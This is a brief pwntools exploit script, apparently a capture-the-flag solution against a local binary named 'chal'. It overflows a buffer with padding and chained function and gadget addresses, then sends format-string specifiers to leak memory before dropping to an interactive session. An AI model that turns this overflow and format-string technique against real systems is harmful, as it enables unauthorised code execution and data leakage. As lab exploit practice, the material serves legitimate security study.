from pwn import *

elf = context.binary = ELF("chal")
context.terminal = ['tmux', 'split-window', '-h']
p = elf.process()

gdb_script = '''
init-pwndbg
'''
#gdb.attach(p, gdb_script)

offset = 72
push_rbp = 0x00000000004011bd
main_after_help = 0x00000000004012b8
test = 0x000000000040131f
ret = 0x000000000040101a
bruh = 0x00000000004012af
payload = flat([
    'a' * 64,
    elf.symbols['main'],
    elf.symbols['use_ticket'],
    ret,
    test,
])
print(len(payload))
#p.sendlineafter(b'song? ', b'%3$p')

p.sendline(payload)
#p.sendlineafter(b'song?', "%p")
p.sendlineafter(b'song? ', b'%5$s')
p.interactive()


